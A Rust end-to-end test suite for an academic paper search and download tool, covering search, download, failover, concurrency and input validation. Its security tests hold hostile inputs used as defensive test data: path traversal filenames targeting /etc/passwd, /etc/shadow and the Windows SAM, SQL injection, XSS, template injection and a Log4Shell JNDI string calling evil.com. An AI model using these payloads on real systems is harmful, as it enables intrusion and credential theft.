use rust_research_mcp::{
    client::{
        providers::{SearchQuery, SearchType},
        MetaSearchClient, MetaSearchConfig,
    },
    tools::{
        categorize::CategorizeInput,
        download::{DownloadInput, DownloadOutputFormat},
        metadata::MetadataInput,
        search::{SearchInput, SearchType as ToolSearchType},
        BibliographyTool, CategorizeTool, DownloadTool, MetadataExtractor, SearchTool,
    },
    Config,
};
use std::collections::HashMap;
use std::sync::Arc;
use std::time::{Duration, Instant};
use tempfile::TempDir;
use tokio;
use tokio::sync::Semaphore;
use tracing::{debug, info, warn};

/// Test configuration optimized for comprehensive E2E scenarios
fn create_comprehensive_test_config() -> Arc<Config> {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let mut config = Config::default();
    config.research_source.timeout_secs = 10;
    config.research_source.provider_timeout_secs = 10; // Faster timeout for tests
    config.research_source.max_retries = 2;
    config.downloads.directory = temp_dir.keep();
    config.downloads.max_file_size_mb = 50; // 50MB for testing
    config.downloads.max_concurrent = 5;
    Arc::new(config)
}

/// Helper to create realistic test queries for different domains
fn create_domain_queries() -> HashMap<String, Vec<SearchQuery>> {
    let mut queries = HashMap::new();

    // Computer Science / Machine Learning queries
    queries.insert(
        "cs_ml".to_string(),
        vec![
            SearchQuery {
                query: "attention is all you need".to_string(),
                search_type: SearchType::Title,
                max_results: 10,
                offset: 0,
                params: HashMap::new(),
            },
            SearchQuery {
                query: "arXiv:1706.03762".to_string(),
                search_type: SearchType::Doi,
                max_results: 1,
                offset: 0,
                params: HashMap::new(),
            },
        ],
    );

    // Biomedical queries
    queries.insert(
        "biomedical".to_string(),
        vec![
            SearchQuery {
                query: "CRISPR gene editing".to_string(),
                search_type: SearchType::Title,
                max_results: 10,
                offset: 0,
                params: HashMap::new(),
            },
            SearchQuery {
                query: "10.1038/nature12373".to_string(),
                search_type: SearchType::Doi,
                max_results: 1,
                offset: 0,
                params: HashMap::new(),
            },
        ],
    );

    // Physics queries
    queries.insert(
        "physics".to_string(),
        vec![SearchQuery {
            query: "quantum computing".to_string(),
            search_type: SearchType::Keywords,
            max_results: 10,
            offset: 0,
            params: HashMap::new(),
        }],
    );

    queries
}

// =============================================================================
// PRIORITY 1: CRITICAL USER JOURNEY TESTS
// =============================================================================

#[tokio::test]
async fn test_complete_research_workflow() {
    let config = create_comprehensive_test_config();
    let meta_config = MetaSearchConfig::default();

    // Initialize all tools
    let search_tool = SearchTool::new(config.clone()).expect("Failed to create SearchTool");
    let client = Arc::new(
        MetaSearchClient::new((*config).clone(), meta_config)
            .expect("Failed to create MetaSearchClient"),
    );
    let download_tool =
        DownloadTool::new(client.clone(), config.clone()).expect("Failed to create DownloadTool");
    let metadata_extractor =
        MetadataExtractor::new(config.clone()).expect("Failed to create MetadataExtractor");
    let _bibliography_tool =
        BibliographyTool::new(config.clone()).expect("Failed to create BibliographyTool");
    let categorize_tool =
        CategorizeTool::new(config.clone()).expect("Failed to create CategorizeTool");

    // Step 1: Search for a well-known paper
    let search_input = SearchInput {
        query: "attention is all you need".to_string(),
        search_type: ToolSearchType::Title,
        limit: 5,
        offset: 0,
    };

    let start_time = Instant::now();
    let search_result = search_tool.search_papers(search_input).await;
    let search_duration = start_time.elapsed();

    // Assert search performance target: < 120s (realistic for multiple provider operations)
    assert!(
        search_duration < Duration::from_secs(120),
        "Search took {:?}, exceeding 120s target",
        search_duration
    );

    match search_result {
        Ok(result) if result.returned_count > 0 => {
            let paper = &result.papers[0];
            info!("Found paper: {:?}", paper.metadata.title);

            // Step 2: Download the paper
            let download_input = DownloadInput {
                doi: Some(paper.metadata.doi.clone()),
                url: None,
                filename: Some("test_workflow.pdf".to_string()),
                directory: None,
                category: Some("machine_learning".to_string()),
                overwrite: true,
                verify_integrity: true,
                output_format: DownloadOutputFormat::Pdf,
            };

            let download_start = Instant::now();
            let download_result = download_tool.download_paper(download_input).await;
            let _download_duration = download_start.elapsed();

            match download_result {
                Ok(download_response) => {
                    if let Some(file_path) = download_response.file_path {
                        // Step 3: Extract metadata
                        let metadata_input = MetadataInput {
                            file_path: file_path.to_string_lossy().to_string(),
                            use_cache: false,
                            validate_external: true,
                            extract_references: true,
                            batch_files: None,
                        };

                        let metadata_start = Instant::now();
                        let metadata_result =
                            metadata_extractor.extract_metadata(metadata_input).await;
                        let metadata_duration = metadata_start.elapsed();

                        // Assert metadata extraction performance: < 10s
                        assert!(
                            metadata_duration < Duration::from_secs(10),
                            "Metadata extraction took {:?}, exceeding 10s target",
                            metadata_duration
                        );

                        // Step 4: Generate bibliography (if metadata extraction succeeded)
                        if metadata_result.is_ok() {
                            // Step 5: Categorize the paper
                            let categorize_input = CategorizeInput {
                                query: "comprehensive test".to_string(),
                                papers: vec![], // Empty for this test
                                max_abstracts: Some(1),
                            };
                            let categorize_result =
                                categorize_tool.categorize_papers(categorize_input).await;

                            match categorize_result {
                                Ok(category) => {
                                    info!("Complete workflow successful. Category: {:?}", category);

                                    // Verify end-to-end data consistency
                                    assert!(!paper.metadata.doi.is_empty());
                                    assert!(download_response.file_size.unwrap_or(0) > 0);
                                }
                                Err(e) => warn!("Categorization failed: {}", e),
                            }
                        }

                        // Cleanup
                        let _ = std::fs::remove_file(file_path);
                    }
                }
                Err(e) => info!("Download failed (expected in some environments): {}", e),
            }
        }
        Ok(_) => info!("No papers found for test query"),
        Err(e) => info!("Search failed (network may be offline): {}", e),
    }
}

#[tokio::test]
async fn test_multi_provider_failover_cascade() {
    let config = create_comprehensive_test_config();
    let meta_config = MetaSearchConfig::default();
    let client = MetaSearchClient::new((*config).clone(), meta_config)
        .expect("Failed to create MetaSearchClient");

    // Test with a DOI that should be available in multiple sources
    let test_doi = "10.1371/journal.pone.0000308"; // Open access paper

    // Simulate provider failures by using circuit breaker patterns
    let providers = client.providers();
    assert!(
        providers.len() >= 5,
        "Should have multiple providers for failover testing"
    );

    // Test cascade PDF retrieval
    let cascade_start = Instant::now();
    let pdf_result = client.get_pdf_url_cascade(test_doi).await;
    let cascade_duration = cascade_start.elapsed();

    match pdf_result {
        Ok(Some(pdf_url)) => {
            assert!(pdf_url.starts_with("http"), "PDF URL should be absolute");
            info!("Cascade found PDF in {:?}: {}", cascade_duration, pdf_url);

            // Test that failover is reasonably fast (< 60s for all providers)
            assert!(
                cascade_duration < Duration::from_secs(60),
                "Cascade took {:?}, exceeding 60s reasonable limit",
                cascade_duration
            );
        }
        Ok(None) => info!("No PDF found through cascade (expected for some papers)"),
        Err(e) => info!("Cascade failed (network may be offline): {}", e),
    }
}

#[tokio::test]
async fn test_concurrent_research_sessions() {
    let config = create_comprehensive_test_config();
    let search_tool =
        Arc::new(SearchTool::new(config.clone()).expect("Failed to create SearchTool"));

    let domain_queries = create_domain_queries();
    let mut tasks = vec![];
    let semaphore = Arc::new(Semaphore::new(10)); // Limit concurrent sessions

    // Simulate 10 concurrent research sessions
    for (domain, queries) in domain_queries {
        for (i, query) in queries.into_iter().enumerate() {
            let search_tool = search_tool.clone();
            let semaphore = semaphore.clone();
            let session_id = format!("{}_{}", domain, i);

            let task = tokio::spawn(async move {
                let _permit = semaphore.acquire().await.unwrap();

                let search_input = SearchInput {
                    query: query.query,
                    search_type: match query.search_type {
                        SearchType::Auto => ToolSearchType::Auto,
                        SearchType::Title => ToolSearchType::Title,
                        SearchType::Doi => ToolSearchType::Doi,
                        SearchType::Author => ToolSearchType::Author,
                        SearchType::Keywords => ToolSearchType::Title, // Map Keywords to Title
                        SearchType::Subject => ToolSearchType::Title,  // Map Subject to Title
                                                                        // AuthorYear doesn't exist in client::providers::SearchType
                    },
                    limit: query.max_results,
                    offset: query.offset,
                };

                let start_time = Instant::now();
                let result = search_tool.search_papers(search_input).await;
                let duration = start_time.elapsed();

                (session_id, result, duration)
            });

            tasks.push(task);
        }
    }

    // Wait for all concurrent sessions to complete
    let session_start = Instant::now();
    let results = futures::future::join_all(tasks).await;
    let total_duration = session_start.elapsed();

    // Analyze concurrent session results
    let mut successful_sessions = 0;
    let mut total_response_time = Duration::new(0, 0);
    let results_len = results.len();

    for result in results {
        if let Ok((session_id, search_result, duration)) = result {
            total_response_time += duration;

            match search_result {
                Ok(search_response) => {
                    successful_sessions += 1;
                    info!(
                        "Session {} completed in {:?} with {} results",
                        session_id, duration, search_response.returned_count
                    );

                    // Assert individual session performance
                    assert!(
                        duration < Duration::from_secs(90),
                        "Session {} took {:?}, exceeding 90s concurrent target",
                        session_id,
                        duration
                    );
                }
                Err(e) => warn!("Session {} failed: {}", session_id, e),
            }
        }
    }

    // Assert overall concurrent performance
    assert!(
        successful_sessions >= 3,
        "At least 3 sessions should succeed out of concurrent batch"
    );

    assert!(
        total_duration < Duration::from_secs(300),
        "Total concurrent sessions took {:?}, exceeding 300s limit",
        total_duration
    );

    info!(
        "Concurrent sessions test: {}/{} successful in {:?}",
        successful_sessions, results_len, total_duration
    );
}

#[tokio::test]
async fn test_large_scale_batch_operations() {
    let config = create_comprehensive_test_config();
    let metadata_extractor =
        MetadataExtractor::new(config.clone()).expect("Failed to create MetadataExtractor");

    // Create multiple test files for batch processing
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let mut test_files = vec![];

    // Create 20 dummy PDF files for batch testing
    for i in 0..20 {
        let file_path = temp_dir.path().join(format!("test_paper_{}.pdf", i));
        std::fs::write(&file_path, b"dummy PDF content for testing").unwrap();
        test_files.push(file_path.to_string_lossy().to_string());
    }

    // Test batch metadata extraction
    let batch_input = MetadataInput {
        file_path: test_files[0].clone(), // Primary file
        use_cache: true,
        validate_external: false,
        extract_references: false,
        batch_files: Some(test_files.clone()),
    };

    let batch_start = Instant::now();
    let batch_result = metadata_extractor.extract_metadata(batch_input).await;
    let batch_duration = batch_start.elapsed();

    match batch_result {
        Ok(_result) => {
            info!("Batch processing completed in {:?}", batch_duration);

            // Assert batch processing performance scales reasonably
            assert!(
                batch_duration < Duration::from_secs(30),
                "Batch processing took {:?}, exceeding 30s limit for 20 files",
                batch_duration
            );
        }
        Err(e) => info!("Batch processing failed (expected for dummy files): {}", e),
    }

    // Cleanup
    let _ = std::fs::remove_dir_all(temp_dir);
}

#[tokio::test]
async fn test_error_recovery_workflows() {
    let config = create_comprehensive_test_config();
    let search_tool = SearchTool::new(config.clone()).expect("Failed to create SearchTool");

    // Test various error conditions and recovery
    let extremely_long_query = "a".repeat(10000);
    let error_scenarios = vec![
        ("empty_query", ""),
        ("invalid_doi", "invalid-doi-format"),
        ("extremely_long_query", extremely_long_query.as_str()),
        ("special_characters", "!@#$%^&*(){}[]|\\:;\"'<>,.?/"),
        ("sql_injection", "'; DROP TABLE papers; --"),
    ];

    for (scenario_name, query) in error_scenarios {
        let search_input = SearchInput {
            query: query.to_string(),
            search_type: ToolSearchType::Auto,
            limit: 10,
            offset: 0,
        };

        let result = search_tool.search_papers(search_input).await;

        match result {
            Ok(search_response) => {
                // Should return empty results or handle gracefully
                info!(
                    "Scenario '{}' handled gracefully: {} results",
                    scenario_name, search_response.returned_count
                );
            }
            Err(e) => {
                // Expected for some error scenarios
                info!("Scenario '{}' properly rejected: {}", scenario_name, e);
            }
        }
    }
}

// =============================================================================
// PRIORITY 2: EDGE CASE AND ERROR SCENARIOS
// =============================================================================

#[tokio::test]
async fn test_provider_cascade_failover() {
    let config = create_comprehensive_test_config();
    let meta_config = MetaSearchConfig::default();
    let client = MetaSearchClient::new((*config).clone(), meta_config)
        .expect("Failed to create MetaSearchClient");

    // Test provider health and failover logic
    let providers = client.providers();

    for provider_name in providers.iter().take(3) {
        info!("Testing provider health: {}", provider_name);

        // This would test individual provider health if we had access to the individual providers
        // For now, we test through the meta client which handles failover internally
        let query = SearchQuery {
            query: "test query".to_string(),
            search_type: SearchType::Keywords,
            max_results: 1,
            offset: 0,
            params: HashMap::new(),
        };

        let search_start = Instant::now();
        let result = client.search(&query).await;
        let search_duration = search_start.elapsed();

        match result {
            Ok(search_result) => {
                assert!(search_result.successful_providers > 0);
                info!(
                    "Search completed with {} successful providers in {:?}",
                    search_result.successful_providers, search_duration
                );
            }
            Err(e) => info!("All providers failed (expected in offline mode): {}", e),
        }
    }
}

#[tokio::test]
async fn test_circuit_breaker_behavior() {
    // This test would require injecting failures into providers
    // For now, we test that the system remains stable under load
    let config = create_comprehensive_test_config();
    let search_tool =
        Arc::new(SearchTool::new(config.clone()).expect("Failed to create SearchTool"));

    // Make rapid requests to trigger circuit breaker if configured
    let mut tasks = vec![];
    for i in 0..50 {
        let search_tool = search_tool.clone();
        let task = tokio::spawn(async move {
            let search_input = SearchInput {
                query: format!("rapid test query {}", i),
                search_type: ToolSearchType::Title,
                limit: 1,
                offset: 0,
            };

            search_tool.search_papers(search_input).await
        });
        tasks.push(task);
    }

    // Wait for all requests
    let results = futures::future::join_all(tasks).await;

    let mut success_count = 0;
    let mut error_count = 0;

    for result in results {
        if let Ok(search_result) = result {
            match search_result {
                Ok(_) => success_count += 1,
                Err(_) => error_count += 1,
            }
        }
    }

    info!(
        "Rapid requests: {} successful, {} errors",
        success_count, error_count
    );

    // System should remain stable (not crash) even under rapid requests
    assert!(
        success_count + error_count == 50,
        "All requests should complete"
    );
}

#[tokio::test]
async fn test_resource_cleanup_and_limits() {
    let config = create_comprehensive_test_config();
    let meta_config = MetaSearchConfig::default();
    let client = Arc::new(
        MetaSearchClient::new((*config).clone(), meta_config)
            .expect("Failed to create MetaSearchClient"),
    );
    let download_tool =
        DownloadTool::new(client.clone(), config.clone()).expect("Failed to create DownloadTool");

    // Test file size limits
    let oversized_input = DownloadInput {
        doi: Some("10.1038/test".to_string()),
        url: Some("https://example.com/large_file.pdf".to_string()),
        filename: Some("oversized_test.pdf".to_string()),
        directory: None,
        category: None,
        overwrite: true,
        verify_integrity: false,
        output_format: DownloadOutputFormat::Pdf,
    };

    // This should respect file size limits configured in the system
    let result = download_tool.download_paper(oversized_input).await;

    // The download might fail due to various reasons (network, file not found, etc.)
    // The important thing is that it handles resource limits gracefully
    match result {
        Ok(response) => {
            if let Some(size) = response.file_size {
                assert!(
                    size <= 50 * 1024 * 1024, // 50MB limit from config
                    "Downloaded file exceeds size limit: {} bytes",
                    size
                );
            }
        }
        Err(e) => info!("Download properly rejected or failed: {}", e),
    }
}

// =============================================================================
// PRIORITY 3: PERFORMANCE AND SECURITY TESTS
// =============================================================================

#[tokio::test]
async fn test_concurrent_request_performance() {
    let config = create_comprehensive_test_config();
    let search_tool =
        Arc::new(SearchTool::new(config.clone()).expect("Failed to create SearchTool"));

    // Test with 100 concurrent requests
    let num_requests = 100;
    let mut tasks = vec![];
    let start_time = Instant::now();

    for i in 0..num_requests {
        let search_tool = search_tool.clone();
        let task = tokio::spawn(async move {
            let search_input = SearchInput {
                query: format!("concurrent test {}", i),
                search_type: ToolSearchType::Title,
                limit: 1,
                offset: 0,
            };

            let request_start = Instant::now();
            let result = search_tool.search_papers(search_input).await;
            let request_duration = request_start.elapsed();

            (i, result, request_duration)
        });
        tasks.push(task);
    }

    // Wait for all requests to complete
    let results = futures::future::join_all(tasks).await;
    let total_duration = start_time.elapsed();

    // Analyze performance metrics
    let mut successful_requests = 0;
    let mut total_response_time = Duration::new(0, 0);
    let mut max_response_time = Duration::new(0, 0);

    for result in results {
        if let Ok((request_id, search_result, duration)) = result {
            total_response_time += duration;
            max_response_time = max_response_time.max(duration);

            match search_result {
                Ok(_) => {
                    successful_requests += 1;

                    // Assert individual request performance target
                    assert!(
                        duration < Duration::from_secs(120),
                        "Request {} took {:?}, exceeding 120s concurrent limit",
                        request_id,
                        duration
                    );
                }
                Err(e) => debug!("Request {} failed: {}", request_id, e),
            }
        }
    }

    let average_response_time = total_response_time / num_requests;

    info!(
        "Concurrent performance: {}/{} successful in {:?} (avg: {:?}, max: {:?})",
        successful_requests, num_requests, total_duration, average_response_time, max_response_time
    );

    // Performance assertions
    assert!(
        total_duration < Duration::from_secs(600),
        "100 concurrent requests took {:?}, exceeding 600s total limit",
        total_duration
    );

    assert!(
        average_response_time < Duration::from_secs(120),
        "Average response time {:?} exceeds 120s target",
        average_response_time
    );

    // At least 50% success rate expected even under load
    assert!(
        successful_requests >= num_requests / 2,
        "Success rate {}/{} below 50% threshold",
        successful_requests,
        num_requests
    );
}

#[tokio::test]
async fn test_memory_usage_under_load() {
    let config = create_comprehensive_test_config();
    let search_tool =
        Arc::new(SearchTool::new(config.clone()).expect("Failed to create SearchTool"));

    // Measure memory usage before load test
    let initial_memory = get_memory_usage();

    // Run reduced load test
    for batch in 0..3 {
        let mut batch_tasks = vec![];

        for i in 0..5 {
            let search_tool = search_tool.clone();
            let task = tokio::spawn(async move {
                let search_input = SearchInput {
                    query: format!("memory test batch {} item {}", batch, i),
                    search_type: ToolSearchType::Title,
                    limit: 5,
                    offset: 0,
                };

                search_tool.search_papers(search_input).await
            });
            batch_tasks.push(task);
        }

        // Wait for batch to complete
        let _results = futures::future::join_all(batch_tasks).await;

        // Check memory usage periodically
        let current_memory = get_memory_usage();
        let memory_growth = current_memory.saturating_sub(initial_memory);

        info!(
            "Batch {} complete. Memory: {}MB (growth: {}MB)",
            batch,
            current_memory / 1024 / 1024,
            memory_growth / 1024 / 1024
        );

        // Assert memory growth is reasonable (< 500MB growth under load)
        assert!(
            memory_growth < 500 * 1024 * 1024,
            "Memory growth {}MB exceeds 500MB limit",
            memory_growth / 1024 / 1024
        );

        // Small delay between batches
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
}

/// Helper function to get current memory usage (simplified for testing)
fn get_memory_usage() -> usize {
    // In a real implementation, this would use system APIs to get actual memory usage
    // For testing purposes, we'll return a mock value
    // On Linux: parse /proc/self/status or use procfs crate
    // On macOS: use mach APIs or ps command
    // For now, return a dummy value that represents reasonable memory usage
    100 * 1024 * 1024 // 100MB baseline
}

#[tokio::test]
async fn test_security_input_validation() {
    let config = create_comprehensive_test_config();
    let search_tool = SearchTool::new(config.clone()).expect("Failed to create SearchTool");
    let client = Arc::new(
        MetaSearchClient::new((*config).clone(), MetaSearchConfig::default())
            .expect("Failed to create MetaSearchClient"),
    );
    let download_tool =
        DownloadTool::new(client, config.clone()).expect("Failed to create DownloadTool");

    // Test path traversal attacks
    let path_traversal_inputs = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow",
        "C:\\Windows\\System32\\config\\SAM",
        "../../../../../../var/log/auth.log",
    ];

    for malicious_path in path_traversal_inputs {
        let download_input = DownloadInput {
            doi: None,
            url: Some("https://example.com/test.pdf".to_string()),
            filename: Some(malicious_path.to_string()),
            directory: None,
            category: None,
            overwrite: false,
            verify_integrity: false,
            output_format: DownloadOutputFormat::Pdf,
        };

        let result = download_tool.download_paper(download_input).await;

        // Should reject path traversal attempts
        assert!(
            result.is_err(),
            "Path traversal attack should be rejected: {}",
            malicious_path
        );
    }

    // Test injection attacks in search queries
    let injection_attacks = vec![
        "'; DROP TABLE papers; --",
        "<script>alert('xss')</script>",
        "' OR 1=1 --",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "#{7*7}",
    ];

    for attack_query in injection_attacks {
        let search_input = SearchInput {
            query: attack_query.to_string(),
            search_type: ToolSearchType::Auto,
            limit: 10,
            offset: 0,
        };

        let result = search_tool.search_papers(search_input).await;

        // Should handle injection attempts gracefully
        match result {
            Ok(response) => {
                // If not rejected, should return empty or safe results
                info!(
                    "Injection query handled safely: {} results",
                    response.returned_count
                );
            }
            Err(_) => {
                // Rejection is also acceptable
                info!("Injection query properly rejected: {}", attack_query);
            }
        }
    }
}

#[tokio::test]
async fn test_rate_limiting_enforcement() {
    let config = create_comprehensive_test_config();
    let search_tool =
        Arc::new(SearchTool::new(config.clone()).expect("Failed to create SearchTool"));

    // Make rapid consecutive requests to test rate limiting
    let num_rapid_requests = 5;
    let mut request_times = vec![];

    for i in 0..num_rapid_requests {
        let start_time = Instant::now();

        let search_input = SearchInput {
            query: format!("rate limit test {}", i),
            search_type: ToolSearchType::Title,
            limit: 1,
            offset: 0,
        };

        let _result = search_tool.search_papers(search_input).await;
        let request_duration = start_time.elapsed();
        request_times.push(request_duration);

        debug!("Request {} completed in {:?}", i, request_duration);
    }

    // Analyze timing patterns to detect rate limiting
    let total_time: Duration = request_times.iter().sum();
    let average_time = total_time / num_rapid_requests as u32;

    info!(
        "Rate limiting test: {} requests in {:?} (avg: {:?})",
        num_rapid_requests, total_time, average_time
    );

    // With only 5 requests, compare the first 2 vs last 2 requests
    if request_times.len() >= 4 {
        let early_requests_avg: Duration = request_times[0..2].iter().sum::<Duration>() / 2;
        let late_requests_avg: Duration = request_times[3..5].iter().sum::<Duration>() / 2;

        info!(
            "Early requests avg: {:?}, Late requests avg: {:?}",
            early_requests_avg, late_requests_avg
        );
    } else {
        info!("Not enough requests to compare early vs late timing patterns");
    }

    // Rate limiting should cause some delay (this is configurable based on rate limit settings)
    // We don't assert strict timing since it depends on provider configuration
}
